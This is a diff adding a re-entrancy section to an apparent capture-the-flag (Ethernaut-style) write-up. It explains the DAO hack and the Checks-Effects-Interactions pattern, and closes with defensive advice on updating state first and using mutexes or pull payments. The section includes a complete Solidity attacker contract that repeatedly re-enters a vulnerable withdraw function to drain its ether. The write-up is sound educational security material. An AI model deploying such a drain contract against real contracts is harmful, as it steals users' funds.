@@ -198,3 +198,71 @@ contract KingAttack {
     }
 }
 ```
+
+## 10. Re-entrancy
+
+This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). This was such a collosal attack that it caused the Ethereum blockchain to fork into the official Ethereum blockchain and Ethereum Classic.
+
+There is a pattern called Checks - Effects - Interactions in Solidity.
+So basically, we check whether we can do something, such as checking balance, we then apply the effects of doing it on our contract, such as updating balance then we do the actual interactions on-chain with other, such as transferring money.
+In this case, the function is withdraw but the interaction comes before the effect. This means that when we receive money from within the withdraw, things are briefly in our control until the program goes back to the withdraw function to do the effect. When we have the control, we can call withdraw once more and the same thing will happen again and again.
+
+When we create the instance in this level we can see that the contract balance has a bit of ether where as we don't have any balance. using the below to check in the terminal
+
+```
+await getBalance(contract.address)
+await contract.balanceOf(player)
+```
+
+We will donate some money to create our initial balance at the target, which will allow the balances[msg.sender] >= \_amount to be true. Now, we can repeadetly withdraw that amount by re-entering the withdraw function. Since balance update effect happens after the transfer interaction, this will go on and on until the balance is depleted. As a defense, we could use a pull-payment approach: the account to be paid must come and withdraw their money themselves, rather than us paying to them, thisis also the method thats used in the minimalistic nft marketplace i deployed on IPFS used.
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+// Interface of the target contract
+interface IReentrance {
+  function donate(address _to) external payable;
+  function withdraw(uint _amount) external;
+}
+
+contract Attacker {
+  address public owner;
+  IReentrance targetContract;
+  uint targetValue = 0.001 ether;
+
+  constructor(address payable _targetAddr) payable {
+    targetContract = IReentrance(_targetAddr);
+    owner = msg.sender;
+  }
+
+  // withdraw money from this contract
+  function withdraw() public {
+    require(msg.sender == owner, "Only the owner can withdraw.");
+    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+    require(sent, "Failed to withdraw.");
+  }
+
+  // begin attack by depositing and withdrawing
+  function attack() public payable {
+    require(msg.value >= targetValue);
+    targetContract.donate{value:msg.value}(address(this));
+    targetContract.withdraw(msg.value);
+    targetValue = msg.value;
+  }
+
+  receive() external payable {
+    uint targetBalance = address(targetContract).balance;
+    if (targetBalance >= targetValue) {
+      // withdraw at most your balance at a time
+      targetContract.withdraw(targetValue);
+    } else if (targetBalance > 0) {
+      // withdraw the remaining balance in the contract
+      targetContract.withdraw(targetBalance);
+    }
+  }
+}
+```
+
+MAIN TAKEAWAY FROM CHALLENGE:
+Always update state variables before calling functions on external contracts. And also never forget to adhere to the mutex pattern or the Checks-Effects-Interactions pattern.
